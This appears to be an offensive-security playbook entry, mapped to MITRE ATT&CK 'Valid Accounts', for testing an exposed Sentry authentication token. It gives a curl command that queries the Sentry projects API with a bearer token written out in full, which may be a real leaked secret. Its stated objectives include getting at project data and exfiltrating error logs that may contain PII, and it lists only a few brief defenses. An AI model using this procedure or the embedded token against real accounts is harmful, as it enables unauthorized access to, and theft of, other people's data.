---
tags:
  - sentry
  - api
  - token
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-sentry-api-test]]'
platforms:
  - Cloud
  - Web
techniques:
  - '[[Valid Accounts]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: b3d38b8d-80a3-47ff-8fb9-49d159ee58be
created_at: '2025-12-14T17:31:42.943Z'
updated_at: '2025-12-14T17:31:42.943Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Test-Exposed-Sentry-Token-with-API-Request

## Summary

This procedure validates an exposed Sentry authentication token by making an authenticated API request to retrieve project data.

## Description

Once a token is extracted, testing its validity confirms active access to Sentry.io resources, such as projects and error logs containing PII. This exploits the token's Bearer authentication to bypass normal access controls.

## Requirements

1. Extracted token
2. curl or similar HTTP client
3. Internet access to sentry.io

## Defense

Defensive measures and detection strategies:

- Rotate tokens regularly
- Monitor API logs for anomalous access
- Use short-lived tokens and RBAC

## Objectives

1. Confirm token activity
2. Access project metadata
3. Exfiltrate logs if possible

## Instructions

### Step 1: Send Authenticated API Request

**Context**: Use the token in the Authorization header to query the projects endpoint.

**Command** ([[commands/curl-sentry-api-test]]):
```bash
curl -X GET -H "Authorization: Bearer 5841673fc43843db98088d579568271bcee388b21d91455b9c1fb151bab260b9" https://sentry.io/api/0/projects/
```

> Returns JSON with project list if valid. Expected output: Array of projects with IDs and names.

### Step 2: Analyze Response

**Context**: Check for sensitive data exposure.

**Command**:
```bash
curl ... | jq '.[] | {id, name, slug}'
```

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/curl-sentry-api-test]]

## Tools Used

- [[tools/curl]]

## Tags

- api-exploitation
- auth-bypass
